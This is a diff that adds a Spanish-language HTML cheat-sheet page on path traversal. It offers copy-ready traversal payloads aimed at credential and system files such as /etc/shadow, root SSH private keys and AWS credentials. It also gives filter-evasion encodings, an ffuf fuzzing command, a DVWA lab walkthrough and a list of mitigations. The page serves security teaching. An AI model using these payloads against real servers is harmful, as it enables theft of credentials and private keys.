@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🛡️ Path Traversal Explorer | Ciberseguridad</title>
+  <style>
+    /* ==== Fuentes y Fondo Cyberpunk ==== */
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
+
+    body {
+      background-color: #0a0a0f;
+      color: #00f0ff;
+      font-family: 'Share Tech Mono', monospace;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
+      background-image: 
+        radial-gradient(circle at 25% 75%, rgba(0, 255, 255, 0.05) 0%, transparent 30%),
+        radial-gradient(circle at 75% 25%, rgba(255, 0, 255, 0.05) 0%, transparent 30%);
+    }
+
+    header {
+      background: linear-gradient(90deg, #000022, #000044);
+      padding: 2rem;
+      text-align: center;
+      border-bottom: 2px solid #00f0ff;
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+    }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2.5rem;
+      margin: 0;
+      color: #00f0ff;
+      text-shadow: 0 0 10px #00f0ff, 0 0 20px #00f0ff;
+      letter-spacing: 2px;
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      color: #aaa;
+      margin-top: 0.5rem;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: 2rem auto;
+      padding: 1rem;
+    }
+
+    .card {
+      background: rgba(0, 10, 20, 0.8);
+      border: 1px solid #00f0ff;
+      border-radius: 8px;
+      margin-bottom: 1.5rem;
+      padding: 1.5rem;
+      box-shadow: 0 0 10px rgba(0, 240, 255, 0.1);
+      backdrop-filter: blur(5px);
+    }
+
+    .card h2 {
+      color: #00d0ff;
+      font-size: 1.6rem;
+      margin-top: 0;
+      border-bottom: 1px dashed #00f0ff;
+      padding-bottom: 0.5rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1rem 0;
+      font-size: 0.95rem;
+    }
+
+    th, td {
+      border: 1px solid #0088aa;
+      padding: 0.7rem;
+      text-align: left;
+    }
+
+    th {
+      background-color: rgba(0, 120, 150, 0.3);
+      color: #00f0ff;
+    }
+
+    tr:nth-child(even) {
+      background-color: rgba(0, 150, 180, 0.05);
+    }
+
+    .btn {
+      background: transparent;
+      color: #00f0ff;
+      border: 1px solid #00f0ff;
+      padding: 0.4rem 0.8rem;
+      font-family: 'Share Tech Mono', monospace;
+      cursor: pointer;
+      transition: all 0.3s;
+      float: right;
+      font-size: 0.85rem;
+    }
+
+    .btn:hover {
+      background: #00f0ff;
+      color: #001122;
+      box-shadow: 0 0 10px #00f0ff;
+    }
+
+    .copy-overlay {
+      position: relative;
+    }
+
+    .hidden-text {
+      position: absolute;
+      left: -9999px;
+    }
+
+    .section-toggle {
+      background: rgba(0, 100, 120, 0.3);
+      border: none;
+      color: #00f0ff;
+      padding: 0.6rem;
+      width: 100%;
+      text-align: left;
+      cursor: pointer;
+      font-family: 'Share Tech Mono', monospace;
+      margin-bottom: 0.5rem;
+      border-radius: 5px;
+      transition: background 0.3s;
+    }
+
+    .section-toggle:hover {
+      background: rgba(0, 200, 220, 0.2);
+    }
+
+    .toggle-content {
+      display: none;
+      padding: 0.8rem 0 0 0;
+    }
+
+    .toggle-content.active {
+      display: block;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem;
+      color: #555;
+      font-size: 0.9rem;
+      border-top: 1px solid #004455;
+      margin-top: 3rem;
+    }
+
+    .glitch {
+      color: #ff00ff;
+      text-shadow: 0 0 5px #ff00ff, 0 0 10px #ff00ff;
+      animation: glitch 2s infinite;
+    }
+
+    @keyframes glitch {
+      0% { text-shadow: 0 0 5px #ff00ff; }
+      50% { text-shadow: 0 0 10px #00f0ff; }
+      100% { text-shadow: 0 0 5px #ff00ff; }
+    }
+
+    .example-box {
+      background: rgba(255, 0, 255, 0.05);
+      border: 1px dashed #ff00ff;
+      padding: 1rem;
+      border-radius: 5px;
+      font-size: 0.95rem;
+    }
+
+    .note {
+      font-size: 0.9rem;
+      color: #ffaa00;
+      margin: 1rem 0;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>PATH TRAVERSAL EXPLORER</h1>
+    <p class="subtitle">Herramienta interactiva de ciberseguridad | Explotación & Mitigación</p>
+  </header>
+
+  <div class="container">
+
+    <!-- Introducción -->
+    <div class="card">
+      <h2>🔍 ¿Qué es Path Traversal?</h2>
+      <p>
+        El <strong>Path Traversal</strong> (o Directory Traversal) es una vulnerabilidad que permite a un atacante acceder a archivos y directorios fuera del directorio raíz de una aplicación web, mediante la manipulación de rutas de archivo (ej: <code>../../</code>).
+      </p>
+      <p class="note">
+        ⚠️ <strong>Impacto:</strong> Lectura de archivos sensibles, escalada de privilegios, posible RCE si se combina con otras técnicas.
+      </p>
+    </div>
+
+    <!-- Rutas Linux -->
+
+<div class="card">
+  <button class="section-toggle" onclick="toggleSection('linux')">🟢 Rutas Linux / Unix (ampliadas) - Haz clic para expandir</button>
+  <div id="linux" class="toggle-content">
+    <p><strong>Categorías disponibles:</strong> Usuarios, Sistema, Logs, Servicios, Bases de datos, Cloud, Contenedores, SSH, y más.</p>
+
+    <table>
+      <tr><th>Ruta</th><th>Descripción</th><th>Acción</th></tr>
+
+      <!-- === USUARIOS Y SISTEMA === -->
+      <tr style="background-color: rgba(0, 200, 255, 0.1);"><td colspan="3"><strong>📁 Usuarios & Sistema</strong></td></tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/passwd</code></td>
+        <td>Lista de usuarios del sistema</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/passwd')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/shadow</code></td>
+        <td>Contraseñas hasheadas (root)</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/shadow')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/group</code></td>
+        <td>Grupos del sistema</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/group')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/hostname</code></td>
+        <td>Nombre del servidor</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/hostname')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/issue</code></td>
+        <td>Mensaje de bienvenida / versión del SO</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/issue')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../proc/version</code></td>
+        <td>Versión del kernel Linux</td>
+        <td><button class="btn" onclick="copyText('../../../../proc/version')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../proc/self/environ</code></td>
+        <td>Variables de entorno del proceso actual</td>
+        <td><button class="btn" onclick="copyText('../../../../proc/self/environ')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../proc/self/cmdline</code></td>
+        <td>Comando que inició el proceso</td>
+        <td><button class="btn" onclick="copyText('../../../../proc/self/cmdline')">Copiar</button></td>
+      </tr>
+
+      <!-- === LOGS === -->
+      <tr style="background-color: rgba(0, 200, 255, 0.1);"><td colspan="3"><strong>📄 Logs del Sistema</strong></td></tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../var/log/auth.log</code></td>
+        <td>Logs de autenticación (SSH, sudo)</td>
+        <td><button class="btn" onclick="copyText('../../../../var/log/auth.log')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../var/log/apache2/access.log</code></td>
+        <td>Logs de acceso de Apache</td>
+        <td><button class="btn" onclick="copyText('../../../../var/log/apache2/access.log')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../var/log/apache2/error.log</code></td>
+        <td>Errores de Apache (a veces con datos sensibles)</td>
+        <td><button class="btn" onclick="copyText('../../../../var/log/apache2/error.log')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../var/log/nginx/access.log</code></td>
+        <td>Logs de Nginx</td>
+        <td><button class="btn" onclick="copyText('../../../../var/log/nginx/access.log')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../var/log/dpkg.log</code></td>
+        <td>Paquetes instalados en Debian/Ubuntu</td>
+        <td><button class="btn" onclick="copyText('../../../../var/log/dpkg.log')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../var/log/kern.log</code></td>
+        <td>Logs del kernel</td>
+        <td><button class="btn" onclick="copyText('../../../../var/log/kern.log')">Copiar</button></td>
+      </tr>
+
+      <!-- === SSH === -->
+      <tr style="background-color: rgba(0, 200, 255, 0.1);"><td colspan="3"><strong>🔐 SSH & Autenticación</strong></td></tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../home/user/.ssh/id_rsa</code></td>
+        <td>Clave privada SSH del usuario</td>
+        <td><button class="btn" onclick="copyText('../../../../home/user/.ssh/id_rsa')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../home/user/.ssh/id_rsa.pub</code></td>
+        <td>Clave pública SSH</td>
+        <td><button class="btn" onclick="copyText('../../../../home/user/.ssh/id_rsa.pub')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../home/user/.ssh/authorized_keys</code></td>
+        <td>Claves autorizadas para SSH</td>
+        <td><button class="btn" onclick="copyText('../../../../home/user/.ssh/authorized_keys')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../root/.ssh/id_rsa</code></td>
+        <td>Clave privada del root (oro puro)</td>
+        <td><button class="btn" onclick="copyText('../../../../root/.ssh/id_rsa')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/ssh/sshd_config</code></td>
+        <td>Configuración de SSH (puertos, opciones)</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/ssh/sshd_config')">Copiar</button></td>
+      </tr>
+
+      <!-- === CONFIGURACIONES === -->
+      <tr style="background-color: rgba(0, 200, 255, 0.1);"><td colspan="3"><strong>⚙️ Configuraciones</strong></td></tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/fstab</code></td>
+        <td>Sistemas de archivos montados</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/fstab')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/crontab</code></td>
+        <td>Tareas programadas (cron)</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/crontab')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/passwd-</code></td>
+        <td>Copia de seguridad de passwd</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/passwd-')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/hosts</code></td>
+        <td>Resolución local de hosts</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/hosts')">Copiar</button></td>
+      </tr>
+
+      <!-- === BASES DE DATOS === -->
+      <tr style="background-color: rgba(0, 200, 255, 0.1);"><td colspan="3"><strong>🗄️ Bases de Datos</strong></td></tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../var/lib/mysql/mysql/user.MYD</code></td>
+        <td>Datos de usuarios de MySQL (en sistemas antiguos)</td>
+        <td><button class="btn" onclick="copyText('../../../../var/lib/mysql/mysql/user.MYD')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../etc/mysql/my.cnf</code></td>
+        <td>Configuración de MySQL (¡a veces con contraseñas!)</td>
+        <td><button class="btn" onclick="copyText('../../../../etc/mysql/my.cnf')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../home/user/.my.cnf</code></td>
+        <td>Configuración personal de MySQL</td>
+        <td><button class="btn" onclick="copyText('../../../../home/user/.my.cnf')">Copiar</button></td>
+      </tr>
+
+      <!-- === CLOUD & DOCKER === -->
+      <tr style="background-color: rgba(0, 200, 255, 0.1);"><td colspan="3"><strong>☁️ Cloud & Contenedores</strong></td></tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../.aws/credentials</code></td>
+        <td>Credenciales de AWS (si está configurado)</td>
+        <td><button class="btn" onclick="copyText('../../../../.aws/credentials')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../.aws/config</code></td>
+        <td>Configuración de AWS</td>
+        <td><button class="btn" onclick="copyText('../../../../.aws/config')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../.docker/config.json</code></td>
+        <td>Credenciales de Docker Hub</td>
+        <td><button class="btn" onclick="copyText('../../../../.docker/config.json')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../run/secrets/</code></td>
+        <td>Secretos en contenedores Docker (Swarm)</td>
+        <td><button class="btn" onclick="copyText('../../../../run/secrets/')">Copiar</button></td>
+      </tr>
+
+      <!-- === HISTORIALES === -->
+      <tr style="background-color: rgba(0, 200, 255, 0.1);"><td colspan="3"><strong>📜 Historiales de Comandos</strong></td></tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../home/user/.bash_history</code></td>
+        <td>Historial de comandos del usuario</td>
+        <td><button class="btn" onclick="copyText('../../../../home/user/.bash_history')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../root/.bash_history</code></td>
+        <td>Historial del root</td>
+        <td><button class="btn" onclick="copyText('../../../../root/.bash_history')">Copiar</button></td>
+      </tr>
+      <tr class="copy-overlay">
+        <td><code>../../../../home/user/.zsh_history</code></td>
+        <td>Historial si usa zsh</td>
+        <td><button class="btn" onclick="copyText('../../../../home/user/.zsh_history')">Copiar</button></td>
+      </tr>
+    </table>
+  </div>
+</div>
+   
+
+    <!-- Rutas Windows -->
+    <div class="card">
+      <button class="section-toggle" onclick="toggleSection('windows')">🔵 Rutas Windows (haz clic para expandir)</button>
+      <div id="windows" class="toggle-content">
+        <table>
+          <tr><th>Ruta</th><th>Descripción</th><th>Acción</th></tr>
+          <tr class="copy-overlay">
+            <td><code>..\..\..\..\Windows\System32\drivers\etc\hosts</code></td>
+            <td>Archivo de hosts del sistema</td>
+            <td><button class="btn" onclick="copyText('..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts')">Copiar</button></td>
+          </tr>
+          <tr class="copy-overlay">
+            <td><code>..\..\..\..\Windows\win.ini</code></td>
+            <td>Configuración del sistema</td>
+            <td><button class="btn" onclick="copyText('..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini')">Copiar</button></td>
+          </tr>
+          <tr class="copy-overlay">
+            <td><code>..\..\..\..\boot.ini</code></td>
+            <td>Configuración de arranque (sistemas antiguos)</td>
+            <td><button class="btn" onclick="copyText('..\\\\..\\\\..\\\\..\\\\boot.ini')">Copiar</button></td>
+          </tr>
+          <tr class="copy-overlay">
+            <td><code>..\..\..\..\Windows\Panther\Unattend.xml</code></td>
+            <td>Puede contener credenciales de instalación</td>
+            <td><button class="btn" onclick="copyText('..\\\\..\\\\..\\\\..\\\\Windows\\\\Panther\\\\Unattend.xml')">Copiar</button></td>
+          </tr>
+        </table>
+      </div>
+    </div>
+
+    <!-- Codificaciones -->
+    <div class="card">
+      <button class="section-toggle" onclick="toggleSection('encoding')">🔐 Codificaciones para Evadir Filtros</button>
+      <div id="encoding" class="toggle-content">
+        <table>
+          <tr><th>Técnica</th><th>Ejemplo</th><th>Uso</th><th>Acción</th></tr>
+          <tr class="copy-overlay">
+            <td>URL Encode</td>
+            <td><code>%2e%2e%2f</code> = <code>../</code></td>
+            <td>Filtrado simple</td>
+            <td><button class="btn" onclick="copyText('%2e%2e%2f')">Copiar</button></td>
+          </tr>
+          <tr class="copy-overlay">
+            <td>Double URL Encode</td>
+            <td><code>%252e%252e%252f</code></td>
+            <td>Filtros que decodifican dos veces</td>
+            <td><button class="btn" onclick="copyText('%252e%252e%252f')">Copiar</button></td>
+          </tr>
+          <tr class="copy-overlay">
+            <td>Backslash (Windows)</td>
+            <td><code>..\..\..\</code></td>
+            <td>Alternativa a /</td>
+            <td><button class="btn" onclick="copyText('..\\\\..\\\\..\\\\')">Copiar</button></td>
+          </tr>
+          <tr class="copy-overlay">
+            <td>Null Byte</td>
+            <td><code>../../../etc/passwd%00</code></td>
+            <td>PHP antiguo</td>
+            <td><button class="btn" onclick="copyText('../../../etc/passwd%00')">Copiar</button></td>
+          </tr>
+        </table>
+      </div>
+    </div>
+
+    <!-- Herramientas -->
+    <div class="card">
+      <button class="section-toggle" onclick="toggleSection('tools')">🛠️ Herramientas Recomendadas</button>
+      <div id="tools" class="toggle-content">
+        <ul>
+          <li><strong>Burp Suite</strong>: Intercepta y modifica peticiones HTTP.</li>
+          <li><strong>ffuf</strong>: Fuzzing de rutas:
+            <pre><code>ffuf -u "http://target.com/load?file=FUZZ" -w wordlist.txt</code></pre>
+          </li>
+          <li><strong>SecLists</strong>: Usa <code>LFI-Jhaddix.txt</code> para wordlists completas.</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Mitigaciones -->
+    <div class="card">
+      <button class="section-toggle" onclick="toggleSection('mitigations')">🛡️ Mitigaciones</button>
+      <div id="mitigations" class="toggle-content">
+        <ul>
+          <li>✅ Validar y normalizar todas las rutas de archivo.</li>
+          <li>✅ Usar listas blancas de archivos permitidos.</li>
+          <li>✅ Ejecutar la app en un entorno sandbox (chroot, contenedor).</li>
+          <li>✅ Deshabilitar acceso a rutas sensibles en el servidor web.</li>
+          <li>✅ Validar extensiones y evitar rutas relativas.</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Ejemplo Práctico DVWA -->
+    <div class="card">
+      <button class="section-toggle" onclick="toggleSection('dvwa')">🎯 Ejemplo: Path Traversal en DVWA</button>
+      <div id="dvwa" class="toggle-content">
+        <h3>DVWA (Damn Vulnerable Web App) - Nivel Bajo</h3>
+        <p>En DVWA, el módulo <strong>File Inclusion</strong> permite probar Path Traversal fácilmente.</p>
+
+        <div class="example-box">
+          <strong>Paso 1:</strong> Accede a DVWA → "File Inclusion"<br>
+          <strong>Paso 2:</strong> En el parámetro <code>page=</code>, introduce:<br>
+          <code>../../../../etc/passwd</code><br>
+          <button class="btn" onclick="copyText('../../../../etc/passwd')">Copiar payload</button>
+        </div>
+
+        <p>Si el nivel de seguridad es "Low", verás el contenido del archivo <code>/etc/passwd</code>.</p>
+
+        <div class="example-box">
+          <strong>Paso 3 (avanzado):</strong> Intenta leer el archivo de configuración de DVWA:<br>
+          <code>../../../../../../var/www/dvwa/config/config.inc.php</code><br>
+          <button class="btn" onclick="copyText('../../../../../../var/www/dvwa/config/config.inc.php')">Copiar</button>
+          <p>➡️ Puede revelar credenciales de la base de datos.</p>
+        </div>
+
+        <p class="note">
+          💡 <strong>Consejo:</strong> Usa Burp Suite para interceptar la petición y modificar el parámetro directamente.
+        </p>
+      </div>
+    </div>
+
+  </div>
+
+  <footer>
+    <p>🛠️ sualba.dev | Creado con ❤️ para avanzar en ciberseguridad | <span class="glitch">Path Traversal Explorer</span></p>
+    <p>Usa este conocimiento con responsabilidad. El hacking ético protege.</p>
+  </footer>
+
+  <script>
+    function toggleSection(id) {
+      const section = document.getElementById(id);
+      section.classList.toggle('active');
+    }
+
+    function copyText(text) {
+      // Crear elemento temporal
+      const textarea = document.createElement('textarea');
+      textarea.value = text;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
+
+      // Feedback visual
+      alert(`¡Copiado al portapapeles!\n\n${text}`);
+    }
+  </script>
+
+</body>
+</html>
